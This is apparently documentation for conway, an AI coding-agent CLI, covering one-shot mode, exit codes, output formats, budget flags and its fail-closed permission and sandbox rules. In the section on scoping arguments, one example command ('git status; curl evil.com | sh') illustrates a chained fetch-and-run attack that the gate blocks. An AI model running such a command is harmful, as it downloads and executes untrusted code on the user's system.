# Scripting conway

`-p`/`--print` runs one prompt and exits — conway's one-shot mode, and a
first-class way to drive the agent, not a stripped-down version of the TUI.
This page covers invoking it, its exit codes, its output formats, and how
permissions work with nobody there to answer a prompt. For the interactive
TUI, see [`interactive.md`](interactive.md); for driving conway as a library
instead of a subprocess, see [`embedding.md`](embedding.md).

## Invocation and input

Pass the prompt as `-p`'s value:

```console
conway -p "what's in this directory? use bash" --allowed-tools bash
```

Or pass `-p` with no value and pipe the prompt on stdin — conway reads it to
EOF, so a large document (bigger than a shell would ever let you pass as a
single argument) can go straight through the pipe instead of onto argv:

```console
echo "what's in this directory? use bash" | conway -p --allowed-tools bash
cat huge-log.txt | conway -p --allowed-tools bash
```

`-p` alone, with stdin attached to a terminal (nothing piped), is a usage
error rather than a hang — one-shot mode never blocks waiting for interactive
input. A present-but-empty stdin (piped, but nothing written) is also a usage
error, not a silent no-op.

**Piping into `-p "<text>"` — an argv prompt AND piped data at once.**
`-p`'s own value is the *directive*; piped (non-terminal) stdin, when it
carries any non-whitespace bytes, is the *data that directive operates on*
— the same split Unix `grep PATTERN` already makes between its own argv
pattern and the corpus it reads from stdin. When both are present, conway
sends the model both, directive first, separated by a blank line:

```console
cat error.log | conway -p "what broke?"
```

is exactly equivalent to running `conway -p` with stdin carrying:

```text
what broke?

<the contents of error.log>
```

If stdin is not piped (a terminal, or simply not redirected), or is piped
but empty, `-p`'s own text is sent alone — unchanged from every version of
this flag before piped-stdin composition existed. Nothing about this is
silent: whichever of the two (or both) supplies the prompt, that's exactly
what the model sees, and nothing pipes through unread.

One consequence worth knowing: since stdin is now read to EOF whenever it
is not a terminal — even when `-p` already has text — a script that runs
`conway -p "<text>"` with stdin inherited from a pipe that never closes and
never terminates will block on that read where an older conway would not
have. This is ordinary Unix filter behavior (`grep PATTERN` blocks the same
way against a non-terminating stdin), not a bug: redirect stdin from
`/dev/null` if you want `-p`'s text alone with no interaction with whatever
stdin your script happened to inherit.

conway exits once the root agent's turn reaches a terminal state — see
"Exit codes" below.

## Exit codes

Exit codes are the entire contract a script can rely on. Every row below
was confirmed by running the built binary and observing the actual process
exit status, not merely read off the source — the integration suite in
`crates/conway-cli/tests/oneshot.rs` drives each one through the real `-p`
entry point.

| Code | Name | When it's produced |
| --- | --- | --- |
| 0 | Completed | The root agent's turn finished with `ResultStatus::Completed`. |
| 1 | AgentFailed | The catch-all: a `Failed` terminal status whose cause is not a routing rejection, a `Rejected` or `Cancelled`-without-SIGINT status, or a `FacadeError::Io`/`Backend`/`Store` (or any other unclassified) error. |
| 2 | Usage | A malformed or conflicting flag, an empty/unreadable prompt, an unknown `--session`/`--resume` id, a malformed `--model`/`--fork-from` reference, or any `FacadeError::Config`/`AgentDef`/`Build`/`UnsupportedFeature`. |
| 4 | NoHealthyBackend | Routing could not supply any model for the turn: the role is unknown (e.g. `--role-override` naming a role the config does not define), no candidate in the role's chain was admissible (an unregistered `backend/model` pair, a health-open breaker, every fallback entry exhausted against a live backend), or the assembled context exceeds every candidate's window (`RoutingError::ContextTooLarge` — no truncation or escalation is performed). |
| 5 | BudgetExceeded | The root agent's turn finished with `ResultStatus::BudgetExceeded` (e.g. `limits.max_steps` reached). |
| 130 | Interrupted | A SIGINT was observed (once, or twice for an immediate hard exit) and the run's terminal status is `Cancelled`. |

Code 3 is unassigned. There is no permission-denied exit code, and that is
a decision, not a gap: a denied tool call becomes a tool result fed back
into the agent's own turn — the model sees the denial, may recover (pick
another tool, or finish without it), and the run legitimately continues.
Terminating the process over a denial would kill runs that complete
successfully. The denial is still observable while it happens, as a
`permission_resolved` envelope in the `jsonl` stream (and a `conway:
warning:` line on stderr in the default `text` format). Under
`--permission-mode deny`, a prompt whose model only ever proposes tool
calls therefore runs until `limits.max_steps` and exits 5, not a
permission-specific code.

A routing failure surfaces through the turn's own terminal status, not as
a separate process-level error: the runtime folds it into
`ResultStatus::Failed`, and the CLI classifies that failure's text as the
routing rejection it is. The practical consequence for a script is only
the table above — branch on 4 for "no model could serve this run," on 1
for everything else that went wrong mid-run. A *config-time* routing
problem (an invalid `routing`/`roles` table) is different: nothing
ever started, so it is a usage error (2).

## Output formats

`--output-format` selects the renderer; the default is `text`.

### `text`

Stdout carries only the assistant's final reply text, streamed as it
arrives, flushed after every delta — `conway -p "…" > out.txt` yields clean
content with nothing else mixed in. Everything else (tool-call activity,
permission resolutions, routing decisions, backend health) is a one-line
`conway: warning: …`/`conway: error: …` note on **stderr**, never stdout.
Routing decisions (`conway: routed role '…' to …`) are further gated behind
`-v`/`--verbose` — omitted at the default verbosity, shown at `-v` and
above.

### `json`

Stdout carries nothing at all until the run finishes, then exactly one JSON
object — the terminal `AgentResult` — and nothing else. Every streaming
envelope is silently dropped; this trades incremental output for "one
document in, one document out" scriptability. A real run, captured live:

```console
$ conway -p "reply with exactly the word pong and nothing else" --output-format json
```

```json
{
  "agent_id": "01KYWYFT24JSQPR1EYQXHMNQX2",
  "status": { "status": "completed" },
  "summary": "pong",
  "facts": [],
  "artifacts": [],
  "structured": null,
  "transcript_ref": "01KYWYFT24KYFWXSBS95GHCQMN",
  "usage": {
    "input_tokens": 15856,
    "output_tokens": 4454,
    "cache_read_tokens": 0,
    "cache_write_tokens": 0,
    "reasoning_tokens": 0
  },
  "steps_taken": 4
}
```

**Two fields here are id-shaped, and only one of them is a session handle.**
`transcript_ref` is what `--session`, `--resume`, and `--fork-from` (see
[`sessions.md`](sessions.md#resuming)) accept — it names the *session*, the
append-only log those flags reattach to, create, or branch from
(`AgentResult::transcript_ref: SessionId`). `agent_id` names the *agent node
in the tree* instead (`AgentResult::agent_id: AgentId`, the same struct) —
useful for correlating this result with the `agent`/`agent_spawned`/
`agent_finished` lines for the same run in a concurrent `jsonl` stream (see
below), but not a session id. It is also the more visually prominent of the
two — first in the object, and the field most output formats lead with — so
it is the one a script is likeliest to reach for first. Passing it to
`--resume` fails: `conway --resume 01KYWYFT24JSQPR1EYQXHMNQX2 …` (this run's
`agent_id`, not its `transcript_ref`) errors with `session … not found`
instead of reattaching. Pass `transcript_ref` — `01KYWYFT24KYFWXSBS95GHCQMN`
above — instead.

### `jsonl`

One JSON line per envelope, uniformly and unconditionally — no event-kind
filtering, unlike `text`. This is the machine-consumable mirror of the whole
stream: everything `text` suppresses or redirects to stderr (tool-call
activity, permission resolutions, routing decisions) is a line here. A real
run, captured live and trimmed to the interesting lines (a denied `bash`
call, then a plain-text answer):

```console
$ conway -p "reply with exactly the word pong and nothing else" --output-format jsonl
```

```json
{"seq":0,"ts":"2026-07-31T20:44:09.986Z","session":"01KYWYQ3BQQ0…","agent":"01KYWYQ3BQWY…","event":"user_turn","text":"reply with exactly the word pong and nothing else","prov":{"type":"user_prompt"}}
{"seq":4,"ts":"2026-07-31T20:44:09.989Z","session":"01KYWYQ3BQQ0…","agent":"01KYWYQ3BQWY…","event":"model_decision","role":"coder","chosen":{"backend":"local","model":"qwen3:4b"},"reason":{"kind":"alias_primary","alias":"coder"},"attempt":0}
{"seq":16,"ts":"2026-07-31T20:45:57.052Z","session":"01KYWYQ3BQQ0…","agent":"01KYWYQ3BQWY…","event":"tool_call_proposed","call_id":"call_li0uco4h","tool":"bash","args":{"command":"echo -n pong"}}
{"seq":17,"ts":"2026-07-31T20:45:57.052Z","session":"01KYWYQ3BQQ0…","agent":"01KYWYQ3BQWY…","event":"permission_requested","call_id":"call_li0uco4h","rendered":"echo -n pong"}
{"seq":18,"ts":"2026-07-31T20:45:57.052Z","session":"01KYWYQ3BQQ0…","agent":"01KYWYQ3BQWY…","event":"permission_resolved","call_id":"call_li0uco4h","decision":"denied_with_feedback"}
{"seq":23,"ts":"2026-07-31T20:47:55.258Z","session":"01KYWYQ3BQQ0…","agent":"01KYWYQ3BQWY…","event":"text_delta","text":"pong"}
{"seq":25,"ts":"2026-07-31T20:47:55.271Z","session":"01KYWYQ3BQQ0…","agent":"01KYWYQ3BQWY…","event":"agent_finished","result":{"agent_id":"01KYWYQ3BQWY…","status":{"status":"completed"},"summary":"pong", …},"ephemeral":false}
```

Every line is a self-contained JSON object with `seq`, `ts`, `session`,
`agent`, and `event` (the event's own kind is `event.event` for a
struct-shaped event, or a bare string like `"turn_started"` for a unit
variant, as in the excerpt above).

When a run forks or spawns a subagent (`conway_fork`/`conway_spawn`/
`conway_ask`), the stream interleaves that child's own lifecycle lines into
the parent's — each stamped with the child's *own* session, agent, and
`seq` counter, not the root's. A trimmed excerpt from a real multi-agent run
(root turn → `conway_spawn` → child text → root final text) shows the
junction:

```json
{"seq":9,"ts":"2026-07-31T20:44:10.010Z","session":"01KYWY…root","agent":"01KYWY…root","event":"tool_call_started","call_id":"call_1"}
{"seq":0,"ts":"2026-07-31T20:44:10.011Z","session":"01KYWZ…child","agent":"01KYWZ…child","event":"agent_spawned","kind":"spawn","parent":"01KYWY…root"}
{"seq":8,"ts":"2026-07-31T20:44:10.400Z","session":"01KYWZ…child","agent":"01KYWZ…child","event":"agent_finished","result":{"agent_id":"01KYWZ…child", "…":"…"},"ephemeral":false}
{"seq":10,"ts":"2026-07-31T20:44:10.401Z","session":"01KYWY…root","agent":"01KYWY…root","event":"message_sent","to":"01KYWY…root","kind":"tool_result"}
```

`seq` jumps from 9 down to 0, then up to 8, then to 10 — global order is
neither monotonic nor gap-free. A consumer must apply this four-part
contract instead:

1. **`seq` is strictly increasing only WITHIN each session's own value**
   — across sessions it can go backward. Group/key lines on `session` (and
   `agent`) before relying on ordering.
2. **The root session's own lines are gap-free from 0** — the subscribed
   session's events pass the filter wholesale — UNLESS the run lagged (a
   `lagged` warning on stderr means envelopes were dropped; gaps can then
   appear anywhere).
3. **Other sessions appear only as sparse lifecycle slices**:
   `agent_spawned`/`agent_finished`/`agent_promoted` lines, stamped with the
   child's own session/agent id and its own counter. Their `seq` values are
   not contiguous, and a subagent's own turn content (its text, tool calls,
   etc.) never appears in this stream — only these lifecycle lines leak
   through.
4. **The stream ends at the `agent_finished` whose `agent` (equivalently
   `result.agent_id`) is the root agent.** Earlier `agent_finished` lines
   belong to subagents — match the id, don't break on the first one, or
   you'll truncate the run and lose the root's own final answer.

`seq` here is the live event counter — a different domain from the
stored-record `seq` shown by `conway sessions show` and `@seq` fork refs.

## Streaming

What arrives incrementally depends on the format: `text` and `jsonl` are
genuinely incremental — `text` flushes each reply chunk as the model emits
it, and `jsonl` writes and flushes one line per event as the event stream
produces it, so a consumer reading either as a pipe sees output before the
run finishes. `json` is not streaming in this sense at all — nothing reaches
stdout until the terminal `AgentResult` is available, by design (see above).

## Being something other than a coding agent

Everything above works whether or not you write code — `-p` is a fast path
to a model's answer, not exclusively an entry point into the coding agent.
Nothing about it requires a repository, a tool, or a coding task:

```console
$ conway -p "translate 'good morning' into French, Spanish, and Japanese" \
    --system-prompt "You are a translator. Reply with only the translations, one per line, no commentary."
Bonjour
Buenos días
おはようございます
```

No `.conway/` directory, no agent definition, no tool access (`--allowed-tools`
was never passed, and an empty allow-list denies every tool — see
"Permissions with no human present" below — which this prompt never needs
anyway) — just a question and an answer, run from any directory. See
[`docs/vision/INTENT.md`](vision/INTENT.md) §7 for why this surface exists
as a first-class target, not a side effect of the coding one.

### `--agent`: run as a named persona

`--agent <name>` runs the session as `.conway/agents/<name>.md` (the same
agent-definition files a subagent can already be forked/spawned into — see
[`docs/agents.md`](agents.md)) instead of the bare, no-persona default. Its
`system_prompt`, `role`, `model`, and tool selector all apply, each still
overridable by its own flag (`--role-override`, `--model`,
`--system-prompt`/`--append-system-prompt` below):

```console
conway -p "review this diff" --agent reviewer < diff.patch
```

An unknown name is a usage error naming both what you typed and the
directory conway searched — never a silent run with no persona at all.
`--agent` is not supported with `--resume` (a resumed session's persona is
fixed by the session it continues) but composes cleanly with `--fork-from`
(the child can be given a different persona than its parent).

### `--system-prompt` / `--append-system-prompt`

`--system-prompt <text>` replaces the effective system prompt outright —
with `--agent` absent, this is what stops a one-shot run from being the
built-in coding agent at all: the run gets exactly that text, and no other
framing, as its system prompt (the quickstart above uses exactly this).
Combined with `--agent`, it replaces that def's own prompt text (the def's
`role`/`tools`/`model` still apply — only the prompt text is swapped).

`--append-system-prompt <text>` adds to whatever system prompt is already
in effect: the named `--agent`'s own prompt, `--system-prompt`'s text if
both are given, or — with neither — becomes the entire system prompt by
itself.

Neither flag is supported with `--resume` or `--fork-from`: a continued
session's system prompt is fixed by the session it continues, not by the
invocation that resumes or forks it, so combining them is a usage error
naming both flags rather than a silent drop.

## Budget flags

The runtime always enforces a turn/token/wall-clock budget (`exit 5`,
`BudgetExceeded`, above) — these three flags are how you set it from the
command line instead of `settings.json`'s `[limits]` table:

| Flag | Overrides |
| --- | --- |
| `--max-turns <n>` | `[limits].max_steps` — the turn (step) ceiling. |
| `--max-tokens <n>` | `[limits].max_tokens` — the total-token ceiling for the run (`0` there means unlimited; a flag value of `0` means the run trips immediately, before any request). |
| `--max-seconds <n>` | `[limits].deadline_secs` — a wall-clock ceiling counted from the moment the run starts (`0` there means no deadline; a flag value of `0` also trips immediately). |

Passing any one of the three still respects the configured value for the
other dimensions — `--max-turns 5` alone does not silently clear a
configured `[limits].max_tokens`. None of the three is supported with
`--resume`/`--fork-from` in this release (a usage error): neither facade
path accepts a caller-supplied budget override yet.

```console
conway -p "summarize this log" --max-turns 3 --max-seconds 30 < build.log
```

### `--output-schema`: structured output

A caller embedding conway in a script has, until this flag, exactly one way
to get JSON back: ask the model for it in the prompt, and hope it doesn't
wrap the answer in prose or a code fence. `--output-schema <path>` makes it
a contract instead of a convention:

```console
conway -p "extract the invoice number and total from this text" \
    --output-schema invoice.schema.json --allowed-tools report < invoice.txt
```

```json
// invoice.schema.json
{
  "type": "object",
  "required": ["invoice_number", "total"],
  "properties": {
    "invoice_number": { "type": "string" },
    "total": { "type": "number" }
  }
}
```

On success, `--output-format json`'s `structured` field carries exactly the
value the model produced, already validated:

```json
{ "status": { "status": "completed" }, "structured": { "invoice_number": "INV-42", "total": 199.5 }, "…": "…" }
```

**How it's enforced, and why the answer is the same for every backend.**
conway never reaches for a backend's own native structured-output/JSON-mode
request field — no backend adapter in this workspace has one wired, and
`--output-schema` does not change that. Instead, the schema becomes this
run's `result_contract`: the SAME schema-checked-at-finish mechanism
`conway_fork`/`conway_spawn`'s own `result_contract` argument already gives
a subagent, now reachable for the root agent a one-shot invocation actually
talks to. Concretely: the flag also appends an instruction to the effective
system prompt telling the model to conclude via the `report` tool's
`structured` argument, matching the schema (so a capable model has a real
chance to comply on its first attempt — pass `--allowed-tools report`, or
include it in a wider `--allowed-tools` list, or the call itself will be
denied); once the model responds with no further tool calls, conway
validates whatever `structured` value it produced (`null` if `report` was
never called) against the schema.

- **A first mismatch costs one corrective turn.** The model is told exactly
  what failed (a system note naming the missing/invalid paths) and gets one
  more attempt.
- **A second mismatch is terminal.** The run ends with `ResultStatus::
  Rejected` (exit code 1) — never a `Completed` status wrapping text nobody
  checked. The rejection's `missing` array names every unmet requirement, so
  a script can log *why*, not just *that*, validation failed.

This is a deliberate, stated design choice, not an oversight: a flag that
enforces on one backend/model and silently degrades to "asked nicely" on
another is exactly the shape this project treats as a defect, so
`--output-schema` never branches on what a backend can natively do — every
backend gets the identical emulated contract, always.

**Composes with `--agent`/`--system-prompt`/`--append-system-prompt`.** The
schema instruction is always appended LAST, after whatever `--agent`'s own
def, `--system-prompt`, and `--append-system-prompt` already produced — it
is the outermost, always-final constraint. If the named `--agent` def also
declares its own `result_contract` (its frontmatter's own key — see
[`docs/agents.md`](agents.md)), `--output-schema`'s schema wins outright:
the two are never merged, and the flag's schema never loses to the def's.

**Composes with `--fork-from`.** A schema combined with `--fork-from` is
enforced against the FORKED CHILD's own structured result (the parent's own
turn, if any, is unaffected):

```console
$ conway -p "branch this" --output-schema answer.schema.json \
    --fork-from 01H8X.../3 --allowed-tools report
```

Still not supported with `--resume`: `conway resume`'s facade has no
per-call parameter of any kind to carry a result-contract override on
(unlike `--fork-from`, which builds a fresh spec per invocation) — the same
"no facade parameter" restriction `--system-prompt`/the budget flags have
with BOTH `--resume` and `--fork-from`.

## Plugin-contributed subcommands

A plugin can add a slash command to the interactive TUI (see
[`docs/plugins/authoring.md`](plugins/authoring.md)) — and, as of this
release, the same declared command is also reachable as a subcommand on the
`conway` binary itself, with no separate registration: anything typed that
is not a built-in subcommand (`sessions`, `routes`) is resolved against
every installed plugin's own commands, namespaced `<plugin-id>.<command-name>`
— the identical scheme the TUI's `/`-prefixed dispatch already uses.

```console
$ conway conway.history.rewind 12
conway.history.rewind: forked session 01K7… at seq 12 -- `conway sessions show 01K7…` to \
inspect it, or `conway -p --resume 01K7…` to continue it
```

This dispatch path has no live session to hand the command yet (unlike the
TUI, which is always driving one), so it starts a fresh, prompt-less
session purely to have real ids to invoke against — the command never
reaches a model. A command that forks the calling session (like `rewind`
above) genuinely forks it; there being no follow-on interactive loop to
hand the child to, the child's own id is printed instead, ready for
`conway sessions show`/`conway -p --resume` to pick up.

An unresolved name — not a built-in, and not declared by any installed
plugin — is a usage error naming what you typed, exactly like any other
unrecognized subcommand.

## Permissions with no human present

One-shot mode has no interactive channel to prompt through, so it fails
**closed** by default: `--permission-mode allowlist` (the default) with no
`--allowed-tools` denies every tool call, with feedback the model can see and
adapt to — never a hang, never a silent allow.

| Mode | `--allowed-tools`/`--deny-tools` | Effect |
| --- | --- | --- |
| `allowlist` (default) | Consulted. | Only a tool named by `--allowed-tools` (and not also named by `--deny-tools`) is allowed; every other call is denied with feedback. Empty `--allowed-tools` (the default) denies every tool call. |
| `deny` | Ignored entirely. | Every tool call is denied with feedback, unconditionally — the same fail-closed mechanism as an empty allow-list, just without consulting either flag. |

Neither mode ever produces a silent hang or an `AllowAlways`: one-shot's gate
never remembers a decision past the single call it was asked about, matching
"a one-shot invocation must never prompt or wait."

**A non-empty `--allowed-tools` also narrows what the model is TOLD it has,
not just what it's permitted to call.** `conway -p "…" --allowed-tools
'read,grep'` announces exactly `read`/`grep` to the model — `bash` is never
in the request's tool schema at all, so a well-behaved model has no way to
propose it in the first place, and the "propose it, get denied, recover"
round trip (and its tokens) never happens. A `--deny-tools` entry subtracts
from the announced set too, but only when it names the WHOLE tool (a bare
`bash`, not a scoped `bash(rm *)`) — a scoped deny leaves the tool announced
since most calls to it would still succeed; only the argument pattern is
refused. Combined with `--agent`, the narrower of the two always wins: an
`--allowed-tools` entry naming a tool the def's own `tools:` selector does
not select is never announced, regardless of the flag.

**An empty `--allowed-tools` (the default) is the one case left
unnarrowed, deliberately.** Every tool stays announced even though none of
them are permitted — see "A `report`/`bash` denial…" below for why
collapsing the announced set to nothing here would trade a graceful denial
for a confusing one, not remove it.

### Scoping an entry to specific arguments

Each entry in `--allowed-tools`/`--deny-tools` is either a bare tool name
(`bash`) or `tool_name(arg_glob)`, e.g. `bash(git *)`. A bare name matches
any call to that tool. `tool_name(arg_glob)` matches only when the tool's
primary argument — `command` for `bash`, or the sole string-valued argument
for a single-argument tool — matches the glob.

```console
conway -p "check the repo status" --allowed-tools 'bash(git *)'
```

This grants narrower access than `--allowed-tools bash`: the model may run
`git status`, `git log`, `git diff`, and so on, but a call whose `command`
doesn't start with `git ` is denied.

**The glob is matched against the argument value, not executed as a shell
prefix check.** For a `bash`-shaped call (`render_kind` `ShellCommand`), a
value containing a shell metacharacter (`;`, `|`, `&`, a backtick, `$(...)`,
a newline, ...) never matches a `tool_name(arg_glob)` entry, even if the
glob itself would otherwise match — `bash(git *)` does not authorize
`git status; curl evil.com | sh`, because the chained command is denied
before the glob is even consulted. This gate does **not** apply to a bare
tool-name entry: `--allowed-tools bash` already grants that tool
unrestricted access, so there is nothing narrower left to protect.

**A `report`/`bash` denial along the way, on an otherwise successful run
with an EMPTY `--allowed-tools`, is expected, not a bug.** With no
`--allowed-tools` at all, a one-shot session still announces every built-in
tool to the model (including `report`, which a session with no parent has
no use for) — see "Permissions with no human present" above for why that
empty-list case is deliberately left unnarrowed. The model may still try
one, get denied with feedback, and fall back to answering in plain text
instead — exactly what the `jsonl` excerpt above shows (`report`, then
`bash`, each proposed and `denied_with_feedback`, followed by a `text_delta`
answer regardless). In `text` mode this same sequence shows up as `conway:
warning: tool call proposed: …`/`permission denied for call …` lines on
stderr; **in `json` mode you won't see it at all** — that format carries
only the terminal result, with no record of which tools were tried and
denied along the way.

**List the tools you actually want the model to use via `--allowed-tools`
and this round trip genuinely stops happening**, rather than merely being
hidden: a non-empty `--allowed-tools` (see above) also narrows what the
model is TOLD it has, so an excluded tool is never in its own request
schema and a compliant model has no way to propose it at all.

See [`permissions.md`](permissions.md) for pattern grants, project trust, and
everything specific to interactive (`prompt`) mode — none of which applies
here, since one-shot mode never uses that mode.

## `--cwd` and `--root`

These two flags are easy to conflate, and mixing them up is the mistake
most likely to cost you real damage — read this before you set either one.

- **`--cwd <DIR>`** sets the process's (and the root agent's own) working
  directory: where the agent *works*, and where a relative tool argument
  starts from. It is **not** a security boundary. It never limits what a
  tool call can reach — an agent given `--cwd /home/alice/project` can
  still read or write `/etc/passwd` if a tool call names that absolute
  path.
- **`--root <DIR>`** confines the root agent — and, by inheritance, every
  subagent it forks or spawns — to that directory: any tool call whose
  path argument resolves outside it is denied before your permission gate
  is ever consulted. This **is** the security boundary. A subagent can
  only narrow its inherited root further, never widen it.

Omit `--root` and the agent is **unconfined**: it can reach anywhere your
user account can reach, exactly like every invocation before this flag
existed. Set `--root` whenever you want a hard guarantee that conway
cannot touch anything outside a directory tree, regardless of what a tool
call asks for or what permission you grant it.

**When you set `--root`, also pass `--cwd` as an absolute path.** conway
must be able to verify the agent's own working directory sits inside the
root before it will start; a relative `--cwd` (or no `--cwd` at all, which
leaves the working directory at its default) can't be checked against the
root and conway refuses to start rather than guess:

```console
conway --cwd /home/alice/project --root /home/alice/project
```

`--cwd` is not supported together with `--fork-from`: a forked child always
inherits its parent session's `cwd`, so combining the two is a usage error
naming both flags rather than a silently dropped one.

## Flag reference

| Flag | Effect |
| --- | --- |
| `-p, --print [PROMPT]` | Run one prompt and exit. With a value and no piped stdin, that value is the prompt; with none, the prompt is read from stdin instead; with both a value AND piped (non-terminal) stdin, they're joined — `PROMPT` as the directive, the piped text as the data, directive first. See "Invocation and input" above. Absent entirely → interactive TUI. |
| `--output-format <text\|json\|jsonl>` | Selects the renderer (default `text`). See "Output formats" above. |
| `--allowed-tools <name[,name…]>` | Comma-separated tool names to allow, consulted when `--permission-mode` is `allowlist` (the default). Each entry is a bare tool name or `tool_name(arg_glob)` to scope the grant to matching arguments (see "Scoping an entry to specific arguments" above). When non-empty, also narrows the tool set announced to the model to exactly this list (intersected with `--agent`'s own `tools:` selector, if any) — see "Permissions with no human present" above. Empty (the default) denies every tool call but leaves the announced set alone. |
| `--deny-tools <name[,name…]>` | Comma-separated tool names to deny even when `--allowed-tools` lists them; also accepts `tool_name(arg_glob)` entries; also consulted only in `allowlist` mode. A bare entry is also dropped from the announced set; a scoped (`tool(arg_glob)`) entry is not. |
| `--permission-mode <allowlist\|deny>` | See "Permissions with no human present" above. |
| `--role-override <role>` | Use this role instead of `default_role` for the session. |
| `--model <backend/model>` | Pin a specific model instead of routing through a role's chain. |
| `--agent <name>` | Run as this named `.conway/agents/<name>.md` definition. See "`--agent`: run as a named persona" above. |
| `--system-prompt <text>` | Replace the effective system prompt outright. See "`--system-prompt` / `--append-system-prompt`" above. |
| `--append-system-prompt <text>` | Add to the effective system prompt instead of replacing it. See above. |
| `--max-turns <n>` | Turn (step) ceiling for this run. See "Budget flags" above. |
| `--max-tokens <n>` | Total-token ceiling for this run. See "Budget flags" above. |
| `--max-seconds <n>` | Wall-clock ceiling, in seconds, for this run. See "Budget flags" above. |
| `--output-schema <path>` | Constrain the run's structured result to a JSON Schema file. See "`--output-schema`: structured output" above. |
| `--session <id>` | Use (creating if new) a specific session id. |
| `--resume <id>` | Reattach to a persisted session and continue its transcript. |
| `--fork-from <id>[@seq]` | Start a new session branched from another one, optionally at a specific point in its log. Not combinable with `--cwd` (see above). |
| `--config <path>` | Load config from this exact path, bypassing the usual discovery walk. |
| `--cwd <dir>` | See "`--cwd` and `--root`" above. |
| `--root <dir>` | See "`--cwd` and `--root`" above. |
| `-v`, `-vv` (`--verbose`) | Stderr diagnostics: `-v` also surfaces routing decisions and other info-level notices; `-vv` also surfaces trace-level detail. `RUST_LOG`, if set, overrides this entirely. Never writes to stdout, at any level — one-shot's stdout-purity contract holds regardless of verbosity. |

`--session`, `--resume`, and `--fork-from` are mutually exclusive; with none
of them, conway starts a fresh session. `--agent` is not supported with
`--resume`; `--system-prompt`/`--append-system-prompt`/`--max-turns`/
`--max-tokens`/`--max-seconds` are not supported with `--resume` or
`--fork-from` — each is a usage error naming the flags involved rather than
a silent drop (see each flag's own section above for why). `--output-schema`
follows that same restriction with `--resume` only — it now composes with
`--fork-from` (see "`--output-schema`: structured output" above).

## Next steps

- [`interactive.md`](interactive.md) — the TUI, for a human in the loop.
- [`embedding.md`](embedding.md) — conway as a Rust library instead of a
  subprocess.
- [`permissions.md`](permissions.md) — permission modes, pattern grants,
  and project-file trust (interactive mode only).
